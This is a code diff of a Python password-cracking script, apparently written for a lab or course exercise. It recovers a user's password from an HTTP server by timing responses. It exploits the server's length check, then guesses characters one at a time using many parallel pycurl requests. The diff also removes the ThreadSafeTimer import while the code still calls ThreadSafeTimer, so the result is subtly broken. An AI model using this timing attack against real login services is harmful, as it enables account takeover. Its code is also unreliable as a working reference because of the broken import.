@@ -1,9 +1,7 @@
 import urllib.parse
 import time
 import string
-from Timer import ThreadSafeTimer
 from concurrent.futures import ThreadPoolExecutor
-from decimal import Decimal, getcontext
 import pycurl
 import io
 import threading
@@ -30,24 +28,17 @@ NUMBER_OF_THREADS = 20*DIFFICULTY + 300
 PASSWORD = ""
 LENGTH = -1
 
-getcontext().prec = 30
 
 ### ------------------------- ###
 ### --- get_curl_instance --- ###
 ### ------------------------- ###
 def get_curl_instance():
-    """
-    Get a persistent curl instance for the current thread.
-    This allows for connection reuse and avoids the overhead of creating
-    a new curl object for each request.
-    each thread will have its own instance of curl client.
-    """
     if not hasattr(_thread_local, 'curl'):
-        _thread_local.curl = pycurl.Curl()
-        # Ensure connection reuse is allowed (default is reuse; explicit for clarity)
-        _thread_local.curl.setopt(pycurl.FORBID_REUSE, 0)
-        _thread_local.curl.setopt(_thread_local.curl.TIMEOUT, 4)
-        _thread_local.curl.setopt(_thread_local.curl.CONNECTTIMEOUT, 5)
+        c = pycurl.Curl()
+        c.setopt(pycurl.FORBID_REUSE, 0)
+        c.setopt(pycurl.TIMEOUT, 4)
+        c.setopt(pycurl.CONNECTTIMEOUT, 5)
+        _thread_local.curl = c
     return _thread_local.curl
 
 ### ------------------------- ###
@@ -55,44 +46,67 @@ def get_curl_instance():
 ### ------------------------- ###
 def try_pass(password):
     global USERNAME, DIFFICULTY, BASE_URL, SERVER_PORT
-    params = {'user': USERNAME, 'password': password, 'difficulty': DIFFICULTY}
-    query_string = urllib.parse.urlencode(params)
-    url = f"http://{BASE_URL}:{SERVER_PORT}/?{query_string}"
-    #url = f"http://127.0.0.1/?{query_string}"
-    # Get persistent curl instance for this thread.
-    c = get_curl_instance()
-    buffer = io.BytesIO()
-    c.setopt(c.URL, url)
-    c.setopt(c.WRITEDATA, buffer)
 
-    num_tries = 5
-    success = False
-    while num_tries > 0 and not success:
+    # Prepare URL
+    params = {'user': USERNAME, 'password': password, 'difficulty': DIFFICULTY}
+    url = f"http://{BASE_URL}:{SERVER_PORT}/?{urllib.parse.urlencode(params)}"
+
+    # Get or create a per-thread curl handle
+    c = get_curl_instance()
+    c.setopt(pycurl.URL, url)
+    c.setopt(pycurl.HTTPHEADER, ["Connection: keep-alive"])
+    # Enable HTTP/2 if supported
+    try:
+        c.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_2TLS)
+    except AttributeError:
+        pass
+
+    # Capture Server-Timing header
+    server_timing = {'value': None}
+    def _header_cb(line: bytes):
+        text = line.decode('utf-8', errors='ignore')
+        if text.lower().startswith('server-timing:'):
+            server_timing['value'] = text.split(':', 1)[1].strip()
+    c.setopt(pycurl.HEADERFUNCTION, _header_cb)
+
+    # Capture body into a tiny buffer so we can read "1" or "0"
+    buffer = io.BytesIO()
+    c.setopt(pycurl.WRITEFUNCTION, buffer.write)
+
+    # Retry on transient errors
+    for attempt in range(5):
         try:
             c.perform()
-            success = True
+            break
         except pycurl.error as e:
-            errno, errstr = e.args
-            num_tries -= 1
-            if num_tries == 0:
-                # Log the error or handle it as needed
-                raise Exception(errstr)
+            if attempt == 4:
+                raise  # give up after 5 tries
 
-    # PRETRANSFER_TIME: The time taken from the start until
-    # just before the transfer begins (includes DNS, TCP handshake, etc.).
-    pretransfer = c.getinfo(c.PRETRANSFER_TIME)
-    # STARTTRANSFER_TIME: The time from the start until
-    # the first byte is received from the server.
-    starttransfer = c.getinfo(c.STARTTRANSFER_TIME)
-    http_code = c.getinfo(c.RESPONSE_CODE)
+    # Extract timings
+    name_lookup = c.getinfo(pycurl.NAMELOOKUP_TIME)
+    connect     = c.getinfo(pycurl.CONNECT_TIME)
+    prexfer     = c.getinfo(pycurl.PRETRANSFER_TIME)
+    startxfer   = c.getinfo(pycurl.STARTTRANSFER_TIME)
+    status      = c.getinfo(pycurl.RESPONSE_CODE)
 
-    c.reset()
+    c.reset()  # ready for next request
 
-    server_time_sec = starttransfer - pretransfer
-    time_ns = Decimal(server_time_sec) * Decimal(1e9)
-    data = int(buffer.getvalue().decode('utf-8')) == 1
+    # Compute server-only time in integer nanoseconds
+    server_ns = int((startxfer - prexfer) * 1e9)
+    # Subtract any global baseline jitter
+    baseline = globals().get("NETWORK_BASELINE_NS", 0)
+    corrected_ns = max(0, server_ns - baseline)
 
-    return {"Status": http_code, "Reason": "", "Time": time_ns, "Data": data}
+    # Determine if the server returned "1"
+    body = buffer.getvalue().strip()
+    data_correct = (status == 200 and body == b'1')
+
+    return {
+        "Status": status,
+        "Time": corrected_ns,
+        "Data": data_correct,
+        "ServerTiming": server_timing['value']
+    }
 
 
 ### ----------------------------- ###
@@ -145,8 +159,8 @@ def crack_next_char(discovered_length, executor):
     char_timer = ThreadSafeTimer(CHARSET)
     futures = []
     for round in range(r):
-        for c in CHARSET:
-            futures.append(executor.submit(try_char, c, discovered_length, char_timer))
+      for c in CHARSET:
+        futures.append(executor.submit(try_char, c, discovered_length, char_timer))
     # Wait for all threads to complete
     # outside of the loop so that each round wont have to wait on
     # the previous one to finish
@@ -175,35 +189,49 @@ def try_char(chars, discovered_length, char_timer):
 ### ---- main --------------- ###
 ### ------------------------- ###
 def main():
-    global PASSWORD, LENGTH, NUMBER_OF_THREADS
+    global PASSWORD, LENGTH, NUMBER_OF_THREADS, USERNAME
 
-    correct = False
-    while not correct:
-      print("...Cracking Password..." , end="\n\n")
-      print("Password - " , end="")
-      try:
-        # first step - exploit the server's length validation
-        LENGTH, time_for_length = crack_password_length()
-        # second step - crack the password char by char
-        discovered_length = 0
-        char_times = []
-        with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
-            while len(PASSWORD) < LENGTH:
-                ch, t = crack_next_char(discovered_length, executor)
-                PASSWORD += ch
-                discovered_length += 1
-                char_times.append(t)
-                print(ch, end="")
-        correct = try_pass(PASSWORD).get('Data')
-        if not correct:
-          print("\nGENERATED PASSWORD IS INCORRECT, trying again...")
+    # Recieve User's ID
+    USERNAME = input("Enter Your ID: ")
+    while not try_pass("test").get("Status") == 200:
+      print("Invalid ID")
+      USERNAME = input("Enter Your ID: ")
+
+    attempt = 1
+
+    clear_output();
+    # Start Cracking (;
+    with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
+      correct = False
+      while not correct:
+        #print(f".....Cracking User {USERNAME}'s Password, attempt {attempt}..." , end="\n\n")
+        #print("Password - " , end="")
+        try:
+          # first step - exploit the server's length validation
+          LENGTH, time_for_length = crack_password_length()
+          # second step - crack the password char by char
+          discovered_length = 0
+          char_times = []
+          while len(PASSWORD) < LENGTH:
+              ch, t = crack_next_char(discovered_length, executor)
+              PASSWORD += ch
+              discovered_length += 1
+              char_times.append(t)
+              print(ch, end="")
+          correct = try_pass(PASSWORD).get('Data')
+          if not correct:
+            print("\nGENERATED PASSWORD IS INCORRECT, trying again...")
+            PASSWORD = ""
+            discovered_length=0
+            time.sleep(3)
+            clear_output()
+        except Exception as e:
+          print(f"\n[ERROR] - {e}")
+          print("trying again...")
           time.sleep(3)
           clear_output()
-      except Exception as e:
-        print(f"\n[ERROR] Connection reset by the server - {e}")
-        print("trying again...")
-        time.sleep(3)
-        clear_output()
+        finally:
+          attempt += 1
 
 
 if __name__ == '__main__':
